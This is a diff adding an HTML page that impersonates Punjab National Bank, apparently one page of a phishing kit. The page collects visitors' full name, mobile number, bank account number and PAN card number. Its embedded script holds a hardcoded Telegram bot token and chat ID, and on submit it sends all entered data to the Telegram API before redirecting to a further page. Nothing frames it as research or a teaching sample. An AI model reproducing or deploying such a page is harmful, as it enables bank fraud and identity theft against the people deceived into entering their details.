@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Punjab National Bank</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        .form-container {
+            background-color: hsl(0, 89%, 26%); /* Red background */
+            padding: 20px;
+            border-radius: 8px;
+            max-width: 400px;
+            margin: 20px auto;
+            border: 3px solid red; /* Red border */
+        }
+
+        .form-container label {
+            font-weight: bold;
+            display: block;
+            margin: 10px 0 5px;
+            color: hsl(0, 100%, 99%); /* Yellow text for labels */
+        }
+
+        .form-container input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            color: #000000; /* Yellow text inside input fields */
+            background-color: hsl(0, 11%, 93%); /* Dark background for inputs */
+        }
+
+        .form-container button {
+            background-color: #f4b400; /* Yellow background */
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .form-container button:hover {
+            background-color: #e0a500;
+        }
+
+        footer {
+            background-color: #2a2a2a;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            margin-top: 20px;
+        }
+
+        footer a {
+            color: #f4b400;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        .banner img {
+            width: 100%;
+            max-height: 300px;
+            object-fit: cover;
+        }
+
+        /* Text Slider Styles */
+        .slider-container {
+            background-color: hsl(0, 0%, 99%);
+            padding: 10px;
+            color: white;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .slider {
+            font-size: 24px;
+            font-weight: bold;
+            white-space: nowrap;
+            overflow: hidden;
+        }
+
+        .slider span {
+            display: inline-block;
+            padding-left: 100%;
+            animation: slide 15s linear infinite;
+        }
+
+        @keyframes slide {
+            0% {
+                transform: translateX(0);
+            }
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        /* Loading box style */
+        #loading-box {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            text-align: center;
+            font-size: 24px;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Section -->
+    <header>
+        <div class="logo-container">
+            <img src="pnb-logo.png" alt="PNB Logo">
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#">Personal</a></li>
+                <li><a href="#">Corporate</a></li>
+                <li><a href="#">NRI</a></li>
+                <li><a href="#">Agri</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Banner Section -->
+    <section class="banner">
+        <img src="banner.png" alt="PNB Banner">
+    </section>
+
+    <!-- Main Content -->
+    <main>
+        <section class="verification-form">
+            <h2>PNB Account Information Form</h2>
+            <form id="verification-form" class="form-container">
+                <label for="name">Full Name:</label>
+                <input type="text" id="name" name="name" placeholder="Enter your full name" required>
+
+                <label for="mobile">Mobile Number:</label>
+                <input type="text" id="mobile" name="mobile" placeholder="Enter your mobile number" maxlength="10" required>
+
+                <label for="account-number">Account Number:</label>
+                <input type="number" id="account-number" name="account-number" placeholder="Enter your account number" maxlength="16" required>
+
+                <label for="pan-card">PAN Card Number:</label>
+                <input type="text" id="pan-card" name="pan-card" placeholder="Enter your PAN Card number" maxlength="10" required>
+
+                <button type="button" id="submit-button">Submit</button>
+            </form>
+        </section>
+    </main>
+
+    <!-- Loading Box -->
+    <div id="loading-box">
+        Processing...
+    </div>
+
+    <!-- Footer Section -->
+    <footer>
+        <p>&copy; 2025 Punjab National Bank. All rights reserved.</p>
+        <p>For support, visit our <a href="#">Help Center</a> or call <a href="tel:+18001802030">1800-180-2030</a></p>
+    </footer>
+
+    <!-- JavaScript for Validation and Telegram Notification -->
+    <script>
+        const botToken = "8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A"; 
+        const chatId = "-1002424646619";
+
+        document.getElementById("submit-button").addEventListener("click", function () {
+            const nameField = document.getElementById("name");
+            const mobileField = document.getElementById("mobile");
+            const accountNumberField = document.getElementById("account-number");
+            const panCardField = document.getElementById("pan-card");
+
+            if (!nameField.value.trim()) {
+                alert("Please enter your full name.");
+                nameField.focus();
+                return;
+            }
+
+            if (!mobileField.value.trim() || mobileField.value.length !== 10) {
+                alert("Please enter a valid 10-digit mobile number.");
+                mobileField.focus();
+                return;
+            }
+
+            if (!accountNumberField.value.trim() || accountNumberField.value.length < 10) {
+                alert("Please enter a valid account number.");
+                accountNumberField.focus();
+                return;
+            }
+
+            if (!panCardField.value.trim() || panCardField.value.length !== 10) {
+                alert("Please enter a valid PAN Card number.");
+                panCardField.focus();
+                return;
+            }
+
+            // Show loading box
+            document.getElementById("loading-box").style.display = "flex";
+
+            // Prepare and send Telegram notification
+            const message = `📊 **PNB Account Information**\n👤 Name: ${nameField.value}\n📱 Mobile: ${mobileField.value}\n💳 Account Number: ${accountNumberField.value}\n📄 PAN Card: ${panCardField.value}`;
+
+            console.log("Sending data to Telegram...");
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Form submitted successfully.");
+                    window.location.href = "4thpage.html";
+                } else {
+                    alert("Error processing your request. Please try again.");
+                }
+            })
+            .catch(error => {
+                console.error("Telegram Error:", error);
+            })
+            .finally(() => {
+                document.getElementById("loading-box").style.display = "none"; // Hide loading box
+            });
+        });
+    </script>
+
+</body>
+</html>
